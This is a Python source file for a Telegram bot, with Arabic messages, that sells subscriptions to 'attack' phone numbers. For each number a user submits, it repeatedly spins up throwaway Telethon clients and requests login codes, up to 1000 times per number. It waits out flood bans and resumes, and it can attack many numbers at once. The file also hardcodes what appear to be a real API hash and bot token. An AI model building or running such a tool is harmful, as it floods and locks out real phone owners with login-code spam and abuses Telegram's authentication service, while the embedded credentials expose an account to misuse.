import os
import asyncio
import json
import logging
import time
import math
from collections import defaultdict
import phonenumbers
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import (
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    FloodWaitError,
    SessionPasswordNeededError,
    rpcerrorlist,
    MessageNotModifiedError
)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Constants
API_ID = 21669021
API_HASH = "bcdae25b210b2cbe27c03117328648a2"
TOKEN = "7821154642:AAEdeYs-NFHfKHeZUKM_ZoHS8rSW19RTLtE"
ADMINS = [6831264078] # Your admin Telegram User IDs
DEVELOPER_LINK = "https://t.me/K_6_3"
SUPPORT_CHAT_ID = -100 # Replace with your support group/channel ID, or leave as -100 if not used

MAX_CONCURRENT_ATTACKS = 50
MAX_ATTEMPTS = 1000
ATTACK_DELAY = 0.1
MAX_USER_ATTACKS = 5 # Max concurrent attacks per regular user

STATS_FILE = 'stats.json'
LOGS_FILE = 'logs.json'

# Global State
attack_semaphore = asyncio.Semaphore(MAX_CONCURRENT_ATTACKS)
stats_lock = asyncio.Lock()
logs_lock = asyncio.Lock()
active_attacks = defaultdict(dict)
pending_admin_actions = {}
stats = {} # Initialized in load_stats
logs = [] # Initialized in load_logs

# --- Utility Functions ---
def load_stats():
    global stats
    if os.path.exists(STATS_FILE):
        try:
            with open(STATS_FILE, 'r') as f:
                data = json.load(f)
                data['user_chats'] = set(data.get('user_chats', []))
                data['subscriptions'] = data.get('subscriptions', {})
                # The new structure for attack_targets will be loaded as is
                data['attack_targets'] = data.get('attack_targets', {})
                stats = data
                return
        except Exception as e:
            logger.error(f"Error loading stats: {e}")
    # Initialize with the new structure in mind
    stats = {'user_chats': set(), 'subscriptions': {}, 'attack_targets': {}}

async def save_stats_async():
    async with stats_lock:
        # Create a copy for saving to avoid issues with the set
        data_to_save = stats.copy()
        data_to_save['user_chats'] = list(stats['user_chats'])
        
        try:
            with open(STATS_FILE, 'w') as f:
                json.dump(data_to_save, f, indent=2)
        except Exception as e:
            logger.error(f"Error saving stats: {e}")

def load_logs():
    global logs
    if os.path.exists(LOGS_FILE):
        try:
            with open(LOGS_FILE, 'r') as f:
                logs = json.load(f)
                return
        except Exception as e:
            logger.error(f"Error loading logs: {e}")
    logs = []

async def save_logs_async(log_entry):
    async with logs_lock:
        logs.append(log_entry)
        # Keep only the last 100 entries for efficiency
        if len(logs) > 100:
            logs[:] = logs[-100:]
        try:
            with open(LOGS_FILE, 'w') as f:
                json.dump(logs, f, indent=2)
        except Exception as e:
            logger.error(f"Error saving logs: {e}")

def format_duration(seconds):
    if seconds <= 0: return "0 ثانية"
    seconds = int(seconds)
    periods = [('يوم', 86400), ('ساعة', 3600), ('دقيقة', 60)]
    result = []
    for name, period in periods:
        if seconds >= period:
            value, seconds = divmod(seconds, period)
            result.append(f"{value} {name}")
    return '، '.join(result) if result else "أقل من دقيقة"

def format_seconds_with_unit(seconds):
    if seconds <= 0: return "0s"
    seconds = int(seconds)
    if seconds < 60: return f"{seconds}s"
    if seconds < 3600: return f"{seconds // 60}m {seconds % 60}s"
    if seconds < 86400: return f"{seconds // 3600}h {(seconds % 3600) // 60}m"
    return f"{seconds // 86400}d"

def check_subscription(user_id):
    return user_id in ADMINS or stats['subscriptions'].get(str(user_id), 0) > time.time()

def is_valid_phone(phone):
    try:
        parsed_phone = phonenumbers.parse(phone, None)
        return phonenumbers.is_valid_number(parsed_phone) and phonenumbers.is_possible_number(parsed_phone)
    except Exception:
        return False

async def update_attack_message(msg_obj, phone, attempts, is_paused=False):
    try:
        current_buttons = [
            [Button.inline(
                f"{'▶️ استئناف' if is_paused else '⏸️ إيقاف مؤقت'} {phone}",
                data=f"{'resume' if is_paused else 'pause'}_attack_{phone}"
            )]
        ]
        await msg_obj.edit(f"📱 الهجوم على: {phone}\n🔥 المحاولات: {attempts}/{MAX_ATTEMPTS}", buttons=current_buttons)
    except MessageNotModifiedError:
        pass
    except Exception as e:
        logger.warning(f"Failed to update attack message for {phone}: {e}")

# --- Core Logic ---
async def flood_attack(phone, event_obj, pause_event_obj):
    chat_id = event_obj.chat_id
    user_id = event_obj.sender_id
    user_id_str = str(user_id)
    msg = None
    attempts = 0

    log_entry = {
        "timestamp": time.time(),
        "user_id": user_id,
        "phone": phone,
        "status": "started",
        "attempts": 0
    }
    await save_logs_async(log_entry)

    try:
        msg = await event_obj.respond(
            f"⚡ بدء الهجوم على الرقم: {phone}",
            buttons=[Button.inline(f"⏸️ إيقاف مؤقت {phone}", data=f"pause_attack_{phone}")]
        )
    except Exception as e:
        logger.error(f"Error sending start message for {phone}: {e}")
        log_entry["status"] = "failed_init"
        log_entry["error"] = str(e)
        await save_logs_async(log_entry)
        return

    try:
        async with attack_semaphore:
            user_targets = stats.get('attack_targets', {}).get(user_id_str, {})
            if phone not in user_targets or user_targets[phone].get('auto_attack_disabled', False):
                await msg.edit(f"تم إلغاء الهجوم على {phone} (غير موجود في قائمتك أو معطل).", buttons=None)
                log_entry["status"] = "cancelled_by_config"
                await save_logs_async(log_entry)
                return

            while phone in active_attacks.get(chat_id, {}) and attempts < MAX_ATTEMPTS:
                await pause_event_obj.wait()
                
                temp_client = None
                try:
                    temp_client = TelegramClient(StringSession(), API_ID, API_HASH)
                    await temp_client.connect()
                    await temp_client.send_code_request(phone)
                    attempts += 1
                except FloodWaitError as e:
                    ban_time = e.seconds
                    stats['attack_targets'][user_id_str][phone]['ban_expires'] = time.time() + ban_time
                    await save_stats_async()
                    await event_obj.respond(f"⛔ تم حظر الرقم {phone}\n⏳ مدة الحظر: {format_duration(ban_time)}")
                    
                    log_entry["status"] = "banned"
                    log_entry["ban_time"] = ban_time
                    log_entry["attempts"] = attempts
                    await save_logs_async(log_entry)

                    if ban_time > 0:
                        await msg.edit(f"🚫 الرقم {phone} محظور لـ {format_duration(ban_time)}. في انتظار انتهاء الحظر...", buttons=None)
                        logger.info(f"Phone {phone} banned for {ban_time} seconds. Waiting...")
                        await asyncio.sleep(ban_time + 5)
                        if not pause_event_obj.is_set():
                            pause_event_obj.set() 
                        await msg.edit(f"✅ انتهى حظر الرقم {phone}. استئناف الهجوم.", buttons=[Button.inline(f"⏸️ إيقاف مؤقت {phone}", data=f"pause_attack_{phone}")])
                        log_entry["status"] = "resumed_after_ban"
                        log_entry["timestamp"] = time.time()
                        await save_logs_async(log_entry)
                        continue
                    else:
                        break
                except PhoneNumberInvalidError:
                    stats.get('attack_targets', {}).get(user_id_str, {}).pop(phone, None)
                    await save_stats_async()
                    await event_obj.respond(f"❌ الرقم `{phone}` غير صالح. إيقاف الهجوم.")
                    log_entry["status"] = "invalid_phone"
                    await save_logs_async(log_entry)
                    break
                except SessionPasswordNeededError:
                    await event_obj.respond(f"⚠️ الرقم `{phone}` يتطلب كلمة مرور ثنائية، لا يمكن الهجوم عليه.")
                    log_entry["status"] = "2fa_needed"
                    await save_logs_async(log_entry)
                    break
                except rpcerrorlist.AuthRestartError:
                    await event_obj.respond(f"⚠️ خطأ في المصادقة للرقم `{phone}`، قد يكون الرقم محذوفاً. إيقاف الهجوم.")
                    log_entry["status"] = "auth_error"
                    await save_logs_async(log_entry)
                    break
                except Exception as e:
                    logger.error(f"Generic error in attack loop for {phone}: {e}")
                    log_entry["status"] = "generic_error"
                    log_entry["error"] = str(e)
                    await save_logs_async(log_entry)
                finally:
                    if temp_client and temp_client.is_connected():
                        await temp_client.disconnect()
                
                await update_attack_message(msg, phone, attempts, not pause_event_obj.is_set())
                await asyncio.sleep(ATTACK_DELAY)

    except asyncio.CancelledError:
        if msg: await msg.edit(f"⏹ تم إيقاف الهجوم نهائياً على: {phone}", buttons=None)
        logger.info(f"Attack on {phone} cancelled.")
        log_entry["status"] = "cancelled"
        log_entry["attempts"] = attempts
        await save_logs_async(log_entry)
    finally:
        if msg:
            try:
                await msg.edit(f"✅ انتهى الهجوم على: {phone}\n🔄 مجموع المحاولات: {attempts}", buttons=None)
            except Exception:
                pass
        active_attacks.get(chat_id, {}).pop(phone, None)
        logger.info(f"Attack on {phone} finished.")
        if log_entry["status"] not in ["cancelled", "invalid_phone", "2fa_needed", "auth_error", "cancelled_by_config", "failed_init", "banned"]:
            log_entry["status"] = "completed"
            log_entry["attempts"] = attempts
            await save_logs_async(log_entry)

# --- Event Handlers ---
client = TelegramClient('spam_bot', API_ID, API_HASH).start(bot_token=TOKEN)

async def display_auto_attack_panel(event_obj, page_num):
    user_id = event_obj.sender_id
    user_id_str = str(user_id)

    if isinstance(event_obj, events.CallbackQuery.Event):
        await event_obj.answer("جاري تحديث القائمة...")
        response_func = event_obj.edit
    else:
        response_func = event_obj.respond

    user_targets = stats.get('attack_targets', {}).get(user_id_str, {})
    total_targets_count = len(user_targets)
    
    now = time.time()
    sorted_targets = sorted(
        user_targets.items(),
        key=lambda item: (item[1].get('ban_expires', 0) if item[1].get('ban_expires', 0) > now else float('inf'),
                          item[1].get('auto_attack_disabled', False))
    )

    items_per_page = 8
    start_index = page_num * items_per_page
    if start_index >= total_targets_count and page_num > 0:
        page_num = max(0, math.ceil(total_targets_count / items_per_page) - 1)
        start_index = page_num * items_per_page
    
    end_index = start_index + items_per_page
    page_items = sorted_targets[start_index:end_index]
    total_pages = max(1, math.ceil(total_targets_count / items_per_page))

    if not user_targets:
        buttons = []
        buttons.append([Button.inline("🔄 تحديث", f"auto_attack_panel_0")])
        if user_id in ADMINS:
            buttons.append([Button.inline("↩️ العودة للقائمة الرئيسية", "admin_panel")])
        else:
            buttons.append([Button.inline("↩️ العودة", "user_main_panel")])
        
        await response_func(f"📭 لا توجد أرقام في قائمتك. (إجمالي أرقامك: {total_targets_count})", buttons=buttons)
        return
    
    if not page_items and total_targets_count > 0 and page_num > 0:
        return await display_auto_attack_panel(event_obj, page_num - 1)

    msg_text = f"**📊 إجمالي أرقامك في السجل: {total_targets_count}**\n\n" + \
               f"**🎯 لوحة الهجوم الخاصة بك (صفحة {page_num + 1} / {total_pages})**\n\n"
    buttons = []
    
    for i, (phone, details) in enumerate(page_items):
        item_num = start_index + i + 1
        status_icon = "🟢" if not details.get('auto_attack_disabled') else "🔴"
        ban_info = ""
        remaining_seconds = 0
        if details.get('ban_expires', 0) > now:
            remaining_seconds = int(details['ban_expires'] - now)
            ban_info = f" | ⏳: {format_seconds_with_unit(remaining_seconds)}"
        
        msg_text += f"`{item_num}`. `{phone}` {status_icon}{ban_info}\n"
        
        toggle_text = "تفعيل" if details.get('auto_attack_disabled') else "إيقاف"
        
        buttons.append([
            Button.inline(f"⚙️ {toggle_text} {phone}", f"toggle_{phone}_{page_num}")
        ])

    nav_buttons = []
    if page_num > 0: nav_buttons.append(Button.inline("⬅️ السابق", f"auto_attack_panel_{page_num-1}"))
    nav_buttons.append(Button.inline("🔄 تحديث", f"auto_attack_panel_{page_num}"))
    if (page_num + 1) < total_pages: nav_buttons.append(Button.inline("➡️ التالي", f"auto_attack_panel_{page_num+1}"))
    
    if nav_buttons: buttons.append(nav_buttons)
    buttons.append([Button.inline("🚀 هجوم على الكل (المفعل)", "start_auto_attack")])
    
    if user_id in ADMINS:
        buttons.append([Button.inline("🗑️ حذف كل السجلات", "clear_all_targets")]) # This is now for all users, for the admin
        buttons.append([Button.inline("↩️ العودة للقائمة الرئيسية", "admin_panel")])
    else:
        buttons.append([Button.inline("🗑️ حذف كل سجلاتي", "clear_my_targets")])
        buttons.append([Button.inline("🗑️ حذف رقم معين", "delete_my_single_phone")])
        buttons.append([Button.inline("↩️ العودة", "user_main_panel")])

    await response_func(msg_text, buttons=buttons, link_preview=False)


@client.on(events.NewMessage(pattern='/start'))
async def welcome_handler(event):
    user_id = event.sender_id
    if user_id not in stats['user_chats']:
        stats['user_chats'].add(user_id)
        await save_stats_async()

    if user_id in ADMINS:
        buttons = [[Button.inline("لوحة الادمن", b"admin_panel")], [Button.inline("🎯 لوحة الهجوم الخاصة بي", b"auto_attack_panel_0")]]
        await event.respond("👋 أهلاً بك أيها الأدمن. استخدم الأزرار للتحكم.", buttons=buttons)
    elif check_subscription(user_id):
        await display_auto_attack_panel(event, 0)
    else:
        message = "👋 أهلاً بك في بوت الهجوم!\n" \
                  "❌ ليس لديك اشتراك فعال حالياً. يرجى التواصل مع الأدمن لتفعيل الاشتراك."
        
        buttons = [[Button.url("💬 التواصل مع الأدمن", url=DEVELOPER_LINK)]]
        await event.respond(message, buttons=buttons)

@client.on(events.NewMessage(pattern='/stop'))
async def stop_handler(event):
    chat_id = event.chat_id
    if not active_attacks.get(chat_id):
        return await event.respond("✅ لا توجد هجمات جارية.")
    
    count = 0
    for phone in list(active_attacks[chat_id].keys()):
        attack_info = active_attacks[chat_id].pop(phone, None)
        if attack_info and 'task' in attack_info:
            attack_info['task'].cancel()
            count += 1
    
    await event.respond(f"⏹ تم إرسال طلب إيقاف نهائي لـ {count} هجوم.")

@client.on(events.NewMessage(pattern='/stats'))
async def show_stats_handler(event):
    user_id = event.sender_id
    if user_id not in ADMINS:
        return await event.respond("🚫 هذا الأمر مخصص للمشرفين فقط.")
    
    total_users = len(stats['user_chats'])
    active_subscriptions = sum(1 for sub_time in stats['subscriptions'].values() if sub_time > time.time())
    
    # Calculate total targets across all users
    total_attack_targets = sum(len(v) for v in stats.get('attack_targets', {}).values())
    
    current_active_attacks_count = 0
    for chat_id_key in active_attacks:
        current_active_attacks_count += len(active_attacks[chat_id_key])

    message = (
        "📊 **إحصائيات البوت:**\n"
        f"  - إجمالي المستخدمين: `{total_users}`\n"
        f"  - الاشتراكات الفعالة: `{active_subscriptions}`\n"
        f"  - إجمالي الأرقام في كل السجلات: `{total_attack_targets}`\n"
        f"  - الهجمات الجارية حالياً: `{current_active_attacks_count}`\n"
    )
    await event.respond(message)

@client.on(events.NewMessage(pattern='/logs'))
async def show_logs_handler(event):
    user_id = event.sender_id
    if user_id not in ADMINS:
        return await event.respond("🚫 هذا الأمر مخصص للمشرفين فقط.")
    
    if not logs:
        return await event.respond("📜 لا توجد سجلات حالياً.")
    
    message = "📜 **آخر 10 سجلات هجوم:**\n\n"
    for entry in reversed(logs[-10:]):
        timestamp_str = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(entry.get("timestamp", time.time())))
        phone = entry.get("phone", "N/A")
        status = entry.get("status", "N/A")
        attempts = entry.get("attempts", 0)
        user = entry.get("user_id", "N/A")

        log_line = f"🕒 `{timestamp_str}`\n" \
                   f"  📞 الرقم: `{phone}`\n" \
                   f"  🚦 الحالة: `{status}`\n" \
                   f"  🔥 المحاولات: `{attempts}`\n"
        if status == "banned" and "ban_time" in entry:
            log_line += f"  ⏳ حظر: `{format_duration(entry['ban_time'])}`\n"
        if "error" in entry:
            log_line += f"  ❌ خطأ: `{entry['error'][:50]}...`\n"
        log_line += f"  👤 المستخدم: `{user}`\n\n"
        message += log_line
    
    await event.respond(message)

@client.on(events.NewMessage(func=lambda e: not e.text.startswith('/') and e.text.strip() != ''))
async def main_message_handler(event):
    user_id = event.sender_id
    user_id_str = str(user_id)
    text = event.text.strip()

    if user_id in ADMINS and pending_admin_actions.get(user_id):
        action_data = pending_admin_actions.pop(user_id)
        action = action_data['action']
        try:
            if action == "activate":
                parts = text.split()
                if len(parts) == 2 and parts[0].isdigit() and parts[1].isdigit():
                    target_id, days = parts[0], int(parts[1])
                    stats['subscriptions'][str(target_id)] = time.time() + days * 86400
                    await save_stats_async()
                    await event.respond(f"✅ تم تفعيل اشتراك للمستخدم `{target_id}` لمدة {days} يوم.")
                    
                    try:
                        await client.send_message(int(target_id), f"✅ تهانينا! تم تفعيل اشتراكك في البوت بنجاح لمدة {days} يوم.")
                    except Exception as e:
                        logger.warning(f"Failed to send subscription activation message to user {target_id}: {e}")
                else:
                    await event.respond("❌ صيغة خاطئة. يرجى إرسال ID المستخدم وعدد الأيام (مثال: `123456789 30`).")
            elif action == "remove":
                target_id = text
                if target_id.isdigit() and stats['subscriptions'].pop(target_id, None):
                    await save_stats_async()
                    await event.respond(f"✅ تم إلغاء اشتراك المستخدم `{target_id}`.")
                    try:
                        await client.send_message(int(target_id), "❌ تم إلغاء اشتراكك في البوت.")
                    except Exception as e:
                        logger.warning(f"Failed to send subscription deactivation message to user {target_id}: {e}")
                else:
                    await event.respond("❌ ID غير صالح أو لا يوجد اشتراك فعال لهذا الـ ID.")
            elif action == "delete_specific_phone":
                phone_to_delete = text.replace("+", "").replace(" ", "")
                if phone_to_delete.isdigit(): phone_to_delete = f"+{phone_to_delete}"

                if is_valid_phone(phone_to_delete):
                    found_and_deleted = False
                    for uid, targets in stats.get('attack_targets', {}).items():
                        if targets.pop(phone_to_delete, None):
                            found_and_deleted = True
                            await event.respond(f"✅ تم حذف الرقم `{phone_to_delete}` من سجلات المستخدم `{uid}`.")
                            break 
                    if not found_and_deleted:
                        await event.respond(f"❌ الرقم `{phone_to_delete}` غير موجود في أي سجل.")
                    else:
                        await save_stats_async()
                else:
                    await event.respond(f"❌ الرقم `{text}` غير صالح.")
            
        except Exception as e:
            logger.error(f"Error in admin action {action}: {e}")
            await event.respond("🚫 حدث خطأ أثناء تنفيذ الإجراء.")
        return
    
    user_action_data = pending_admin_actions.get(user_id)
    if user_id not in ADMINS and user_action_data:
        action = user_action_data['action']
        if action == "delete_my_specific_phone":
            phone_to_delete = text.replace("+", "").replace(" ", "")
            if phone_to_delete.isdigit(): phone_to_delete = f"+{phone_to_delete}"

            if is_valid_phone(phone_to_delete):
                if stats.get('attack_targets', {}).get(user_id_str, {}).pop(phone_to_delete, None):
                    await save_stats_async()
                    await event.respond(f"✅ تم حذف الرقم `{phone_to_delete}` من سجلاتك بنجاح.")
                else:
                    await event.respond(f"❌ الرقم `{phone_to_delete}` غير موجود في سجلاتك.")
            else:
                await event.respond(f"❌ الرقم `{text}` غير صالح.")
            pending_admin_actions.pop(user_id, None)
            return

    if not check_subscription(user_id):
        message = "👋 أهلاً بك في بوت الهجوم!\n" \
                  "❌ ليس لديك اشتراك فعال حالياً. يرجى التواصل مع الأدمن لتفعيل الاشتراك."
        buttons = [[Button.url("💬 التواصل مع الأدمن", url=DEVELOPER_LINK)]]
        return await event.respond(message, buttons=buttons)

    user_active_attacks_count = len(active_attacks.get(event.chat_id, {}))
    if user_id not in ADMINS and user_active_attacks_count >= MAX_USER_ATTACKS:
        return await event.respond(f"⚠️ لقد وصلت إلى الحد الأقصى من الهجمات المتزامنة ({MAX_USER_ATTACKS}).")

    new_attacks_started = 0
    for line in text.split('\n'):
        phone_raw = line.strip()
        if phone_raw:
            phone = phone_raw.replace("+", "").replace(" ", "")
            if phone.isdigit(): phone = f"+{phone}"
            
            if is_valid_phone(phone):
                user_targets = stats.get('attack_targets', {}).setdefault(user_id_str, {})
                
                if phone not in user_targets:
                    user_targets[phone] = {'ban_expires': 0, 'auto_attack_disabled': False}
                
                if phone not in active_attacks.get(event.chat_id, {}):
                    ban_expires = user_targets[phone].get('ban_expires', 0)
                    if ban_expires > time.time():
                        remaining_ban_time = int(ban_expires - time.time())
                        await event.respond(f"⚠️ الرقم `{phone}` محظور حاليًا. (متبقي: {format_duration(remaining_ban_time)}).")
                        continue
                    
                    pause_event = asyncio.Event()
                    pause_event.set()
                    task = asyncio.create_task(flood_attack(phone, event, pause_event))
                    active_attacks[event.chat_id][phone] = {'task': task, 'pause_event': pause_event}
                    new_attacks_started += 1
                else:
                    await event.respond(f"⚠️ الرقم `{phone}` قيد الهجوم بالفعل.")
            else:
                await event.respond(f"❌ الرقم `{phone_raw}` غير صالح.")
    
    if new_attacks_started > 0:
        await save_stats_async()
        if new_attacks_started == 1:
            pass
        else:
            await event.respond(f"✅ تم بدء الهجوم على {new_attacks_started} رقمًا جديدًا.")
    elif not event.text.startswith('/'):
        await event.respond("ℹ️ يرجى إرسال رقم هاتف صالح لبدء الهجوم.")


@client.on(events.CallbackQuery)
async def callback_handler(event):
    user_id = event.sender_id
    user_id_str = str(user_id)
    data = event.data.decode('utf-8')
    chat_id = event.chat_id

    if data.startswith("pause_attack_") or data.startswith("resume_attack_"):
        action, phone = data.split("_", 2)[0], data.split("_", 2)[2]
        attack_info = active_attacks.get(chat_id, {}).get(phone)
        if not attack_info:
            await event.answer("الهجوم انتهى بالفعل.", alert=True)
            return

        if action == "pause":
            attack_info['pause_event'].clear()
            await event.edit(buttons=[[Button.inline(f"▶️ استئناف {phone}", data=f"resume_attack_{phone}")]])
            await event.answer("⏸️ تم إيقاف الهجوم مؤقتاً")
        elif action == "resume":
            attack_info['pause_event'].set()
            await event.edit(buttons=[[Button.inline(f"⏸️ إيقاف مؤقت {phone}", data=f"pause_attack_{phone}")]])
            await event.answer("▶️ تم استئناف الهجوم")
    
    elif data == "check_my_subscription":
        if user_id in ADMINS:
            return await event.answer("أنت أدمن، لديك وصول كامل.", alert=True)

        if check_subscription(user_id):
            sub_end_time = stats['subscriptions'].get(str(user_id), 0)
            remaining_time = int(sub_end_time - time.time())
            await event.answer(f"✅ اشتراكك فعال. ينتهي خلال: {format_duration(remaining_time)}.", alert=True)
        else:
            await event.answer("❌ ليس لديك اشتراك فعال حالياً.", alert=True)

    elif data.startswith("auto_attack_panel_"):
        page = int(data.split('_')[-1])
        await display_auto_attack_panel(event, page)
        
    elif data.startswith("toggle_"):
        if not check_subscription(user_id):
             return await event.answer("🚫 ليس لديك اشتراك.", alert=True)
        _, phone, page_str = data.split("_", 2)
        page = int(page_str)
        
        user_targets = stats.get('attack_targets', {}).get(user_id_str, {})
        if phone in user_targets:
            user_targets[phone]['auto_attack_disabled'] = not user_targets[phone].get('auto_attack_disabled', False)
            await save_stats_async()
            await event.answer("✅ تم تغيير الحالة")
            await display_auto_attack_panel(event, page)
        else:
            await event.answer("❌ الرقم غير موجود في قائمتك.", alert=True)

    elif data == "start_auto_attack":
        if not check_subscription(user_id):
            return await event.answer("❌ ليس لديك اشتراك فعال.", alert=True)
            
        targets_to_attack = []
        current_active_phones = set(active_attacks.get(chat_id, {}).keys())

        user_targets = stats.get('attack_targets', {}).get(user_id_str, {})
        for phone, details in user_targets.items():
            if not details.get('auto_attack_disabled') and phone not in current_active_phones:
                ban_expires = details.get('ban_expires', 0)
                if ban_expires <= time.time():
                    targets_to_attack.append(phone)
                else:
                    logger.info(f"Skipping auto-attack for {phone} as it's still banned.")

        count = 0
        for phone in targets_to_attack:
            pause_event = asyncio.Event()
            pause_event.set()
            active_attacks[chat_id][phone] = {
                'task': asyncio.create_task(flood_attack(phone, event, pause_event)),
                'pause_event': pause_event
            }
            count += 1
        
        await event.answer(f"✅ تم بدء الهجوم على {count} رقم مفعل وجاهز.", alert=True)

    elif data == "clear_all_targets":
        if user_id not in ADMINS: return await event.answer("🚫 للأدمن فقط.", alert=True)
        buttons = [[Button.inline("✅ نعم، متأكد", "confirm_clear_all"), Button.inline("❌ إلغاء", "admin_panel")]]
        await event.edit("⚠️ **تنبيه!** هل أنت متأكد من حذف كل سجلات الهجوم من كل المستخدمين؟", buttons=buttons)

    elif data == "confirm_clear_all":
        if user_id not in ADMINS: return await event.answer("🚫 للأدمن فقط.", alert=True)
        stats['attack_targets'].clear()
        await save_stats_async()
        await event.edit("✅ تم حذف كل السجلات من البوت بنجاح.", buttons=[[Button.inline("⬅️ العودة للقائمة الرئيسية", "admin_panel")]])

    elif data == "clear_my_targets":
        if not check_subscription(user_id): return await event.answer("❌ ليس لديك اشتراك.", alert=True)
        buttons = [[Button.inline("✅ نعم، متأكد", "confirm_clear_my_targets"), Button.inline("❌ إلغاء", "user_main_panel")]]
        await event.edit("⚠️ **تنبيه!** هل أنت متأكد من حذف كل سجلاتك؟", buttons=buttons)

    elif data == "confirm_clear_my_targets":
        if not check_subscription(user_id): return await event.answer("❌ ليس لديك اشتراك.", alert=True)
        
        if user_id_str in stats.get('attack_targets', {}):
            stats['attack_targets'][user_id_str].clear()
            await save_stats_async()
        
        await event.edit("✅ تم حذف كل سجلاتك بنجاح.", buttons=[[Button.inline("⬅️ العودة", "user_main_panel")]])

    elif data == "admin_panel":
        if user_id not in ADMINS: return await event.answer("🚫 للأدمن فقط.", alert=True)
        buttons = [
            [Button.inline("تفعيل اشتراك", b"activate_sub")],
            [Button.inline("إلغاء اشتراك", b"remove_sub")],
            [Button.inline("🎯 لوحة الهجوم الخاصة بي", b"auto_attack_panel_0")],
            [Button.inline("🗑️ حذف رقم من مستخدم", b"delete_single_phone")],
            [Button.inline("📊 الإحصائيات العامة", b"show_general_stats")],
            [Button.inline("📜 سجل العمليات", b"show_logs_panel")]
        ]
        await event.edit("🔧 أوامر إدارة الاشتراكات ولوحة التحكم:", buttons=buttons)
    
    elif data == "show_general_stats":
        if user_id not in ADMINS: return await event.answer("🚫 للأدمن فقط.", alert=True)
        await show_stats_handler(event)
        await event.answer()

    elif data == "show_logs_panel":
        if user_id not in ADMINS: return await event.answer("🚫 للأدمن فقط.", alert=True)
        await show_logs_handler(event)
        await event.answer()

    elif data == "activate_sub":
        if user_id not in ADMINS: return await event.answer("🚫 للأدمن فقط.", alert=True)
        pending_admin_actions[user_id] = {"action": "activate"}
        await event.edit("✍️ أرسل ID المستخدم وعدد الأيام (مثال: `123456789 30`).")

    elif data == "remove_sub":
        if user_id not in ADMINS: return await event.answer("🚫 للأدمن فقط.", alert=True)
        pending_admin_actions[user_id] = {"action": "remove"}
        await event.edit("✍️ أرسل ID المستخدم المراد إلغاء اشتراكه.")
    
    elif data == "delete_single_phone":
        if user_id not in ADMINS: return await event.answer("🚫 للأدمن فقط.", alert=True)
        pending_admin_actions[user_id] = {"action": "delete_specific_phone"}
        await event.edit("✍️ أرسل الرقم الذي تريد حذفه من سجلات أي مستخدم.")

    elif data == "delete_my_single_phone":
        if not check_subscription(user_id): return await event.answer("❌ ليس لديك اشتراك.", alert=True)
        pending_admin_actions[user_id] = {"action": "delete_my_specific_phone"}
        await event.edit("✍️ أرسل الرقم الذي تريد حذفه من سجلاتك.")

    elif data == "user_main_panel":
        if not check_subscription(user_id): return await event.answer("❌ ليس لديك اشتراك.", alert=True)
        await display_auto_attack_panel(event, 0)
        await event.answer()

# Load stats and logs on startup
load_stats()
load_logs()

# Main loop
async def main():
    logger.info("Bot is starting...")
    await client.run_until_disconnected()

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())